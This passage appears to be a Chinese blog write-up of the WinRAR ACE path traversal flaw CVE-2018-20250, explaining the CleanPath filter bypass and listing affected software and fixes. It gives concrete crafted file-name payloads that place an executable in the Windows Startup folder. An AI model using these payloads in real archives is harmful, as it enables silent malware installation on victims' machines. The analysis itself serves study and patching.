-    crc32       0x69e27254
-    comptype    0x00        stored
-    compqual    0x03        normal
-    params      0x000a
-    reserved1   0x4554
-    filename    b&#39;C:\\C:\\114514\\oc.txt&#39;
-    comment     b&#39;&#39;
-    ntsecurity  b&#39;&#39;
-    reserved2   b&#39;&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;PS：&lt;code&gt;\\&lt;/code&gt; 代表着的是 &lt;code&gt;\&lt;/code&gt;，由于 python 的转义原因这里显示成 &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;可以很明显地发现 &lt;code&gt;filename&lt;/code&gt; 属性是携带路径信息的，作为一个安全研究人员，很容易就应该想到这里可能隐藏着的路径穿越的风险。&lt;/p&gt;
-
-&lt;p&gt;然后就是一大段逆向 + fuzz 测试的神操作，这里贴一下国外研究者的思路（清晰明确，值得学习）：&lt;/p&gt;
-
-&lt;p&gt;首先，解压路径有两种可能的选择方式： &lt;code&gt;sprintf(final_file_path, &amp;quot;%s%s&amp;quot;, &amp;quot;&amp;quot;, file_relative_path);&lt;/code&gt; 以及 &lt;code&gt;sprintf(final_file_path, &amp;quot;%s%s&amp;quot;, destination_folder, file_relative_path);&lt;/code&gt;，其中第一种以绝对路径展开，第二种以相对路径展开，而第二种很明显会被 &lt;code&gt;destination_folder&lt;/code&gt; 变量所控制，因此我们想要进行目录穿越的话，需要控制程序的执行流，使其执行第一种函数。&lt;/p&gt;
-
-&lt;p&gt;而如何选择的方式取决于 &lt;code&gt;GetDevicePathLen&lt;/code&gt; 函数的执行结果，只有该函数的返回值大于 0 的时候才会进入函数一。&lt;/p&gt;
-
-&lt;p&gt;暗戳戳贴一下大佬的伪代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/WinRAR-Absolute-Path-Traversal-Vulnerability-CVE-2018-20250/GetDevicePathLen.png&#34; alt=&#34;GetDevicePathLen&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;再贴段说明：
-如果参数如 &lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;，则函数返回 3
-如果参数如 &lt;code&gt;\some_folder\some_file.ext&lt;/code&gt;，则函数返回 1
-如果参数如 &lt;code&gt;\\LOCALHOST\C$\some_folder\some_file.ext&lt;/code&gt;，则函数返回 15
-如果参数如 &lt;code&gt;\\?\Harddisk0Volume1\some_folder\some_file.ext&lt;/code&gt;，则函数返回 21
-如果参数如 &lt;code&gt;some_folder\some_file.ext&lt;/code&gt;，则函数返回 0&lt;/p&gt;
-
-&lt;p&gt;因此我们很明显有两种选择可以作为 payload：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;\some_folder\some_file.ext (The first slash represents the current drive.)&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;然而，在执行该函数之前，我们需要绕过过滤函数 &lt;code&gt;CleanPath&lt;/code&gt; 的检验，该函数的伪代码如下图：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/WinRAR-Absolute-Path-Traversal-Vulnerability-CVE-2018-20250/CleanPath.png&#34; alt=&#34;CleanPath&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;该函数会删除选项 1 前的 &lt;code&gt;C:\&lt;/code&gt;，因此我们需要再额外修改一下 payload &lt;code&gt;C:\C:\some_folder\some_file.ext&lt;/code&gt;，此时该路径在被过滤后得到 &lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;跟着执行流程往下走，可以发现回到 WinRAR 的代码内，会继续校验相应参数，此时 &lt;code&gt;\&lt;/code&gt; 会被认为是相对路径而中断执行。但此时 payload1 是以 &lt;code&gt;C:\&lt;/code&gt; 开头，所以不会被 WinRAR 的代码阻止，仍然有效，目录穿越成功！&lt;/p&gt;
-
-&lt;h2 id=&#34;缺陷&#34;&gt;缺陷&lt;/h2&gt;
-
-&lt;p&gt;由于该目录只是任意写的问题，所以不能直接导致代码执行。但攻击者巧妙地利用了 Windows 的机制，在 Windows 重启后全局启动项目录里的程序会被执行，因此可以向全局启动目录写入恶意程序的方式，在用户重启后控制用户电脑。&lt;/p&gt;
-
-&lt;p&gt;再贴一下研究者推测的两种攻击思路：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/li&gt;
-&lt;li&gt;C:\Users&amp;lt;user name&amp;gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;其中第一种可以写绝对路径，相对高效，但在 &lt;code&gt;UAC&lt;/code&gt; 打开的情况下会失效（权限问题），而第二种没有权限限制的问题但需要知道用户的用户名。&lt;/p&gt;
-
-&lt;p&gt;但俗话说得好，方法总比困难多，在研究者的不懈努力下，发现
-&lt;code&gt;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe&lt;/code&gt; 在被 &lt;code&gt;CleanPath&lt;/code&gt; 过滤后会得到 &lt;code&gt;C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe&lt;/code&gt;，完美地定位到了第二种攻击需要的启动目录下，攻击成功！&lt;/p&gt;
-
-&lt;h2 id=&#34;影响-修复&#34;&gt;影响 &amp;amp;&amp;amp; 修复&lt;/h2&gt;
-
-&lt;p&gt;由于该漏洞是由于动态链接库 UNACEV2.dll 所造成的，所以一旦该动态链接被被其他压缩软件所使用的话，同样能存在相同的安全隐患。&lt;/p&gt;
-
-&lt;p&gt;可能存在风险的软件如下：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;WinRAR &amp;lt; 5.70 Beta 1&lt;/li&gt;
-&lt;li&gt;Bandizip &amp;lt; = 6.2.0.0&lt;/li&gt;
-&lt;li&gt;好压(2345 压缩) &amp;lt; = 5.9.8.10907&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;修复方式：将使用的压缩软件更新到最新版或直接删除 &lt;code&gt;UNACEV2.dll&lt;/code&gt; 文件&lt;/p&gt;
-
-&lt;h2 id=&#34;思考&#34;&gt;思考&lt;/h2&gt;
-
-&lt;p&gt;关于该漏洞影响的严重性，这个问题之前在某群聊里也引起过群友的讨论，关于该漏洞能否称之为代码执行尚待商榷，但不可否认的是，在适当的条件下，本漏洞带来的任意文件写可能引发极大的安全隐患。比如当攻击者掌握另一个漏洞能触发系统崩溃的时候，此时任意文件写的作用就体现出来了。攻击者可以先将恶意程序写到系统的启动目录再触发系统崩溃，系统自动重启后就会执行该恶意程序，代码执行，完美（理想情况）。或者另一种利用思路是 dll 劫持，即通过覆盖相应 dll 的方式将攻击者编写的恶意 dll 覆盖系统 dll 进而攻击用户。&lt;/p&gt;
-
-&lt;p&gt;在写博客的时候发现了最新的报告 &lt;a href=&#34;http://www.mottoin.com/news/134594.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;垃圾邮件利用WinRAR ACE漏洞安装后门程序&lt;/a&gt;，可以看出攻击者也是别出心裁（丧心病狂）了。&lt;/p&gt;
-
-&lt;p&gt;以及再暗暗立个 flag，改天我也要学会用 fuzz 然后 fuzz 出洞来，看大佬一波操作真的酸的不行🍋&lt;/p&gt;
-
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/171374?tdsourcetag=s_pcqq_aiomsg&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;CVE-2018-2025[0-3] WinRAR 代码执行漏洞预警&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-249613.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;[分享]WinRAR Exploit CVE-2018-20250 漏洞复现&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/extracting-code-execution-from-winrar/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Extracting a 19 Year Old Code Execution from WinRAR&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/Hz-uN9VEejYN6IHFBtUSRQ&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;首个完整利用WinRAR漏洞传播的恶意样本分析&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
 </description>
     </item>
     
